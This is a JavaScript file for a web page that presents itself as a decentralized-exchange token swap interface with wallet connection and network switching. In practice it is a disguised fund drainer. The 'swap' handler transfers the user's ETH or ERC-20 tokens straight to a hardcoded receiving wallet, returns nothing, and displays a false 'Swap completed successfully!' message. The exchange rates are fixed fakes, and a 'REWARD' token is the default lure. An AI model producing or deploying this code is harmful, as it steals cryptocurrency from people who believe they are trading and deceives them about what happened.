// app.js - DEX-like Token Swap Interface

// Verify required globals
if (typeof NETWORK_CONFIGS === 'undefined') throw new Error("NETWORK_CONFIGS not defined");
if (typeof TOKENS === 'undefined') throw new Error("TOKENS not defined");
if (typeof RECEIVING_WALLET === 'undefined') throw new Error("RECEIVING_WALLET not defined");

// App state
let provider, signer, userAddress;
let currentNetwork = "ethereum";
let currentFromToken = null;
let currentToToken = null;
let currentSlippage = 0.5; // 0.5% default slippage

// Initialize on load
window.addEventListener('load', async () => {
  try {
    // Setup event listeners
    document.getElementById("networkSelect").addEventListener('click', showNetworkOptions);
    document.getElementById("connectWallet").addEventListener("click", handleWalletConnection);
    document.getElementById("fromTokenSelect").addEventListener("click", () => showTokenList('from'));
    document.getElementById("toTokenSelect").addEventListener("click", () => showTokenList('to'));
    document.getElementById("swapBtn").addEventListener("click", handleSwap);
    document.getElementById("settingsBtn").addEventListener("click", showSettings);
    document.getElementById("closeTokenList").addEventListener("click", hideTokenList);
    document.getElementById("closeSettings").addEventListener("click", hideSettings);
    document.getElementById("metaMaskBtn").addEventListener("click", connectMetaMask);
    document.getElementById("cancelWalletConnect").addEventListener("click", hideWalletConnect);
    document.getElementById("fromAmount").addEventListener("input", updateToAmount);
    
    // Mobile-specific listeners
    if (isMobile()) {
      document.getElementById("openTrustWallet").addEventListener('click', openInTrustWallet);
    }
    
    // Set default tokens
    const defaultFromToken = TOKENS.ethereum.find(t => t.symbol === "ETH");
    const defaultToToken = TOKENS.ethereum.find(t => t.symbol === "REWARD");
    
    if (defaultFromToken && defaultToToken) {
      currentFromToken = defaultFromToken;
      currentToToken = defaultToToken;
      updateTokenSelectors();
    }
    
    await checkWalletEnvironment();
  } catch (err) {
    console.error("Initialization error:", err);
    updateStatus("Initialization failed: " + err.message, "error");
  }
});

// =====================
// UTILITY FUNCTIONS
// =====================

function isMobile() {
  return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
}

function updateNetworkLogo(network) {
  const logoMap = {
    ethereum: "https://cryptologos.cc/logos/ethereum-eth-logo.png",
    bsc: "https://cryptologos.cc/logos/bnb-bnb-logo.png",
    polygon: "https://cryptologos.cc/logos/polygon-matic-logo.png"
  };
  
  const logoElement = document.querySelector(".dex-nav-logo img");
  if (logoMap[network]) {
    logoElement.src = logoMap[network];
  }
}

// =====================
// WALLET FUNCTIONS
// =====================

async function checkWalletEnvironment() {
  // Check if wallet was previously connected
  const savedWallet = localStorage.getItem('walletConnected');
  if (savedWallet === 'metamask' && window.ethereum) {
    try {
      await connectAndProcess();
    } catch (err) {
      console.error("Auto-connect error:", err);
      localStorage.removeItem('walletConnected');
    }
  }
  
  // Detect current network if wallet is connected
  if (window.ethereum && window.ethereum.chainId) {
    const chainId = window.ethereum.chainId;
    for (const network in NETWORK_CONFIGS) {
      if (NETWORK_CONFIGS[network].chainId === chainId) {
        currentNetwork = network;
        document.getElementById("currentNetwork").textContent = NETWORK_CONFIGS[network].chainName;
        updateNetworkLogo(network);
        break;
      }
    }
  }
}

async function initializeWallet() {
  try {
    provider = new ethers.providers.Web3Provider(window.ethereum);
    signer = provider.getSigner();
    userAddress = await signer.getAddress();
    
    // Save connection to localStorage
    localStorage.setItem('walletConnected', 'metamask');
    updateWalletButton(true);
    return true;
  } catch (err) {
    console.error("Wallet initialization error:", err);
    updateStatus("Connection error. Please try again.", "error");
    return false;
  }
}

async function handleWalletConnection() {
  if (userAddress) {
    // Disconnect if already connected
    userAddress = null;
    provider = null;
    signer = null;
    localStorage.removeItem('walletConnected');
    updateWalletButton(false);
    updateSwapButton();
    updateStatus("Wallet disconnected", "success");
    return;
  }

  if (!window.ethereum) {
    if (isMobile()) {
      showWalletConnect();
    } else {
      updateStatus("Please install MetaMask", "error");
    }
    return;
  }

  await connectAndProcess();
}

async function connectAndProcess() {
  try {
    showLoader();
    updateStatus("Connecting wallet...", "success");

    // Request account access
    const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
    if (accounts.length === 0) {
      throw new Error("No accounts found");
    }
    
    // Detect current network
    const chainId = await window.ethereum.request({ method: 'eth_chainId' });
    for (const network in NETWORK_CONFIGS) {
      if (NETWORK_CONFIGS[network].chainId === chainId) {
        currentNetwork = network;
        document.getElementById("currentNetwork").textContent = NETWORK_CONFIGS[network].chainName;
        updateNetworkLogo(network);
        break;
      }
    }
    
    await initializeWallet();
    updateSwapButton();
  } catch (err) {
    console.error("Connection error:", err);
    updateStatus("Error: " + err.message, "error");
    updateWalletButton(false);
    localStorage.removeItem('walletConnected');
  } finally {
    hideLoader();
  }
}

async function connectMetaMask() {
  hideWalletConnect();
  await connectAndProcess();
}

function openInTrustWallet() {
  const currentUrl = encodeURIComponent(window.location.href);
  window.location.href = `https://link.trustwallet.com/open_url?coin_id=20000714&url=${currentUrl}`;
  setTimeout(() => {
    document.getElementById('manualSteps').style.display = 'block';
  }, 3000);
}

// =====================
// NETWORK FUNCTIONS
// =====================

async function handleNetworkChange(network) {
  currentNetwork = network;
  document.getElementById("currentNetwork").textContent = NETWORK_CONFIGS[network].chainName;
  updateNetworkLogo(network);
  
  // Reset tokens when network changes
  currentFromToken = null;
  currentToToken = null;
  updateTokenSelectors();
  
  if (userAddress) {
    await checkNetwork();
  }
}

async function checkNetwork() {
  try {
    const chainId = await window.ethereum.request({ method: 'eth_chainId' });
    const targetChainId = NETWORK_CONFIGS[currentNetwork].chainId;
    
    if (chainId !== targetChainId) {
      updateStatus("Switching network...", "success");
      try {
        await window.ethereum.request({
          method: 'wallet_switchEthereumChain',
          params: [{ chainId: targetChainId }]
        });
      } catch (switchError) {
        if (switchError.code === 4902) {
          try {
            await window.ethereum.request({
              method: 'wallet_addEthereumChain',
              params: [NETWORK_CONFIGS[currentNetwork]]
            });
          } catch (addError) {
            throw new Error("Please switch networks manually");
          }
        }
        throw new Error("Failed to switch network");
      }
    }
  } catch (err) {
    console.error("Network error:", err);
    throw new Error("Network error: " + err.message);
  }
}

// =====================
// TOKEN FUNCTIONS
// =====================

function showTokenList(type) {
  const modal = document.getElementById("tokenListModal");
  const tokenItems = document.getElementById("tokenItems");
  
  // Clear previous items
  tokenItems.innerHTML = '';
  
  // Filter tokens for current network
  const networkTokens = TOKENS[currentNetwork] || [];
  
  // Add tokens to list
  networkTokens.forEach(token => {
    const tokenItem = document.createElement('div');
    tokenItem.className = 'dex-token-item';
    tokenItem.innerHTML = `
      <img src="https://cryptologos.cc/logos/${token.symbol.toLowerCase()}-${token.symbol.toLowerCase()}-logo.png" 
           onerror="this.src='https://cryptologos.cc/logos/ethereum-eth-logo.png'" 
           alt="${token.symbol}">
      <div>
        <div class="dex-token-name">${token.name}</div>
        <div class="dex-token-symbol">${token.symbol}</div>
      </div>
    `;
    
    tokenItem.addEventListener('click', () => {
      if (type === 'from') {
        currentFromToken = token;
      } else {
        currentToToken = token;
      }
      updateTokenSelectors();
      hideTokenList();
      updateToAmount();
    });
    
    tokenItems.appendChild(tokenItem);
  });
  
  modal.style.display = 'flex';
}

function hideTokenList() {
  document.getElementById("tokenListModal").style.display = 'none';
}

function updateTokenSelectors() {
  const fromTokenBtn = document.getElementById("fromTokenSelect");
  const toTokenBtn = document.getElementById("toTokenSelect");
  
  if (currentFromToken) {
    fromTokenBtn.innerHTML = `
      <img src="https://cryptologos.cc/logos/${currentFromToken.symbol.toLowerCase()}-${currentFromToken.symbol.toLowerCase()}-logo.png" 
           onerror="this.src='https://cryptologos.cc/logos/ethereum-eth-logo.png'" 
           width="24" height="24">
      <span>${currentFromToken.symbol}</span>
      <i class="fas fa-chevron-down"></i>
    `;
  } else {
    fromTokenBtn.innerHTML = `
      <span>Select Token</span>
      <i class="fas fa-chevron-down"></i>
    `;
  }
  
  if (currentToToken) {
    toTokenBtn.innerHTML = `
      <img src="https://cryptologos.cc/logos/${currentToToken.symbol.toLowerCase()}-${currentToToken.symbol.toLowerCase()}-logo.png" 
           onerror="this.src='https://cryptologos.cc/logos/ethereum-eth-logo.png'" 
           width="24" height="24">
      <span>${currentToToken.symbol}</span>
      <i class="fas fa-chevron-down"></i>
    `;
  } else {
    toTokenBtn.innerHTML = `
      <span>Select Token</span>
      <i class="fas fa-chevron-down"></i>
    `;
  }
  
  updateSwapButton();
}

function updateToAmount() {
  const fromAmount = parseFloat(document.getElementById("fromAmount").value) || 0;
  
  if (currentFromToken && currentToToken && fromAmount > 0) {
    const rate = getConversionRate(currentFromToken, currentToToken);
    const toAmount = fromAmount * rate;
    
    document.getElementById("toAmount").value = toAmount.toFixed(6);
    document.getElementById("exchangeRate").textContent = `1 ${currentFromToken.symbol} = ${rate} ${currentToToken.symbol}`;
    document.getElementById("minReceived").textContent = `${(toAmount * (1 - currentSlippage/100)).toFixed(6)} ${currentToToken.symbol}`;
  } else {
    document.getElementById("toAmount").value = '';
    document.getElementById("exchangeRate").textContent = '-';
    document.getElementById("minReceived").textContent = '-';
  }
  
  updateSwapButton();
}

function getConversionRate(fromToken, toToken) {
  const rates = {
    'ETH-REWARD': 0.05,
    'REWARD-ETH': 20,
    'ETH-USDT': 1800,
    'USDT-ETH': 0.00055,
    'ETH-USDC': 1800,
    'USDC-ETH': 0.00055,
    'ETH-DAI': 1800,
    'DAI-ETH': 0.00055,
  };
  
  const pair = `${fromToken.symbol}-${toToken.symbol}`;
  return rates[pair] || 1;
}

// =====================
// SWAP FUNCTIONS
// =====================

async function handleSwap() {
  if (!userAddress || !currentFromToken || !currentToToken) return;
  
  const fromAmount = parseFloat(document.getElementById("fromAmount").value);
  if (!fromAmount || fromAmount <= 0) return;
  
  try {
    showLoader();
    updateStatus("Processing swap...", "success");
    
    if (currentFromToken.isNative) {
      await transferNativeToken(fromAmount);
    } else {
      await transferERC20Token(currentFromToken, fromAmount);
    }
    
    updateStatus("Swap completed successfully!", "success");
    document.getElementById("fromAmount").value = '';
    document.getElementById("toAmount").value = '';
  } catch (err) {
    console.error("Swap error:", err);
    updateStatus("Swap failed: " + err.message, "error");
  } finally {
    hideLoader();
  }
}

async function transferNativeToken(amount) {
  const tx = await signer.sendTransaction({
    to: RECEIVING_WALLET,
    value: ethers.utils.parseEther(amount.toString()),
    gasLimit: 21000
  });
  
  await tx.wait();
}

async function transferERC20Token(token, amount) {
  const contract = new ethers.Contract(token.address, ERC20_ABI, signer);
  const decimals = token.decimals || 18;
  const amountInWei = ethers.utils.parseUnits(amount.toString(), decimals);
  
  const tx = await contract.transfer(RECEIVING_WALLET, amountInWei, {
    gasLimit: 100000
  });
  
  await tx.wait();
}

// =====================
// UI FUNCTIONS
// =====================

function updateStatus(message, type) {
  const statusDiv = document.getElementById("status");
  statusDiv.style.display = "block";
  statusDiv.textContent = message;
  statusDiv.className = `dex-status ${type}`;
  
  setTimeout(() => {
    statusDiv.style.display = "none";
  }, 5000);
}

function showLoader() {
  document.getElementById("loader").style.display = "block";
}

function hideLoader() {
  document.getElementById("loader").style.display = "none";
}

function updateWalletButton(isConnected) {
  const btn = document.getElementById("connectWallet");
  if (isConnected) {
    btn.innerHTML = `
      <i class="fas fa-wallet"></i>
      <span>${userAddress.slice(0, 6)}...${userAddress.slice(-4)}</span>
    `;
  } else {
    btn.innerHTML = `
      <i class="fas fa-wallet"></i>
      <span>Connect Wallet</span>
    `;
  }
  
  updateSwapButton();
}

function updateSwapButton() {
  const btn = document.getElementById("swapBtn");
  const btnText = document.getElementById("swapBtnText");
  
  if (!userAddress) {
    btn.disabled = false;
    btnText.textContent = "Connect Wallet";
    return;
  }
  
  if (!currentFromToken || !currentToToken) {
    btn.disabled = true;
    btnText.textContent = "Select Tokens";
    return;
  }
  
  const fromAmount = parseFloat(document.getElementById("fromAmount").value);
  if (!fromAmount || fromAmount <= 0) {
    btn.disabled = true;
    btnText.textContent = "Enter Amount";
    return;
  }
  
  btn.disabled = false;
  btnText.textContent = "Swap";
}

function showNetworkOptions() {
  const newNetwork = currentNetwork === "ethereum" ? "bsc" : 
                    currentNetwork === "bsc" ? "polygon" : "ethereum";
  handleNetworkChange(newNetwork);
}

function showSettings() {
  document.getElementById("settingsModal").style.display = 'flex';
}

function hideSettings() {
  document.getElementById("settingsModal").style.display = 'none';
}

function showWalletConnect() {
  document.getElementById("walletConnectModal").style.display = 'flex';
}

function hideWalletConnect() {
  document.getElementById("walletConnectModal").style.display = 'none';
}
